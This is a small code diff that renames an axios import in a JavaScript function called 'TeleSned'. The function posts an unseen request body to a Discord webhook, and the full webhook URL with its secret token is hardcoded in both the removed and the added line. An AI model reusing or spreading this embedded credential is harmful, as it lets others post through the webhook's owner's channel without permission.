@@ -1,4 +1,4 @@
-import axios from 'axios';
+import Axios from 'axios';
 
 
 export const TeleSned = () => {
@@ -16,7 +16,7 @@ export const TeleSned = () => {
           ],
     };
             
-        await axios.post("https://discordapp.com/api/webhooks/1220950132426674237/TDiKwJiv6Mi1Vc9gvQdb6EYR-T2xO0OqeTGD5001U4CpwNg8UP6vu3D0eyxHPBzza1Kh",body)
+        await Axios.post("https://discordapp.com/api/webhooks/1220950132426674237/TDiKwJiv6Mi1Vc9gvQdb6EYR-T2xO0OqeTGD5001U4CpwNg8UP6vu3D0eyxHPBzza1Kh",body)
              
     }
   return {
